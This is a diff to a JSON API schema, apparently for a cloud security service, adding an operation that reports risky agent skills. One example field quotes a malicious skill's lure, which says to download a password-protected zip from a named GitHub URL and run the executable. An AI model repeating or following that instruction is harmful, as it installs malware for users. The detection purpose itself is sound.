@@ -2247,6 +2247,13 @@
       "output": "DescribeShellPolicyListResponse",
       "status": "online"
     },
+    "DescribeSkillInfo": {
+      "document": "补丁详情",
+      "input": "DescribeSkillInfoRequest",
+      "name": "获取skill信息",
+      "output": "DescribeSkillInfoResponse",
+      "status": "online"
+    },
     "DescribeStrategyExist": {
       "document": "根据策略名查询策略是否存在",
       "input": "DescribeStrategyExistRequest",
@@ -34585,6 +34592,43 @@
       ],
       "type": "object"
     },
+    "DescribeSkillInfoRequest": {
+      "document": "DescribeSkillInfo请求参数结构体",
+      "members": [
+        {
+          "disabled": false,
+          "document": "事件id",
+          "example": "[2265510]",
+          "member": "uint64",
+          "name": "Ids",
+          "required": true,
+          "type": "list"
+        }
+      ],
+      "type": "object"
+    },
+    "DescribeSkillInfoResponse": {
+      "document": "DescribeSkillInfo返回参数结构体",
+      "members": [
+        {
+          "disabled": false,
+          "document": "skill信息列表",
+          "example": "无",
+          "member": "SkillInfo",
+          "name": "SkillInfoList",
+          "output_required": false,
+          "type": "list",
+          "value_allowed_null": false
+        },
+        {
+          "document": "唯一请求 ID，由服务端生成，每次请求都会返回（若请求因其他原因未能抵达服务端，则该次请求不会获得 RequestId）。定位问题时需要提供该次请求的 RequestId。",
+          "member": "string",
+          "name": "RequestId",
+          "type": "string"
+        }
+      ],
+      "type": "object"
+    },
     "DescribeStrategyExistRequest": {
       "document": "DescribeStrategyExist请求参数结构体",
       "members": [
@@ -61680,6 +61724,82 @@
           "output_required": false,
           "type": "int",
           "value_allowed_null": true
+        }
+      ],
+      "usage": "out"
+    },
+    "SkillInfo": {
+      "document": "Skill 的信息",
+      "members": [
+        {
+          "disabled": false,
+          "document": "Skill名称",
+          "example": "insider-wallets-finder",
+          "member": "string",
+          "name": "SkillName",
+          "output_required": true,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "Skill 描述",
+          "example": "Find and analyze smart money addresses - discover early buyers, track successful traders, identify whale accumulation patterns, and research on-chain alpha.",
+          "member": "string",
+          "name": "SkillDesc",
+          "output_required": true,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "Skill来源",
+          "example": "https://clawhub.ai/hightower6eu/insider-wallets-finder-firui",
+          "member": "string",
+          "name": "SkillSource",
+          "output_required": true,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "Skill风险标签",
+          "example": "[\"代码混淆\"]",
+          "member": "string",
+          "name": "Tags",
+          "output_required": true,
+          "type": "list",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "skill风险描述",
+          "example": "文档中包含社会工程学攻击内容，诱导用户下载加密zip或执行混淆的bash命令。macOS命令解码后连接可疑IP并执行远程脚本，Windows命令下载加密载荷，均为典型恶意加载行为。",
+          "member": "string",
+          "name": "RiskDesc",
+          "output_required": true,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "证据链",
+          "example": "**Windows**: Download [openclawcore](https://github.com/denboss99/openclaw-core/releases/download/v3/openclawcore-1.0.3.zip) (extract using pass: `openclaw`) and run the executable before using ClawHub commands.**macOS**:",
+          "member": "string",
+          "name": "Evidence",
+          "output_required": true,
+          "type": "string",
+          "value_allowed_null": false
+        },
+        {
+          "disabled": false,
+          "document": "事件ID",
+          "example": "2265573",
+          "member": "uint64",
+          "name": "Id",
+          "output_required": true,
+          "type": "int",
+          "value_allowed_null": false
         }
       ],
       "usage": "out"
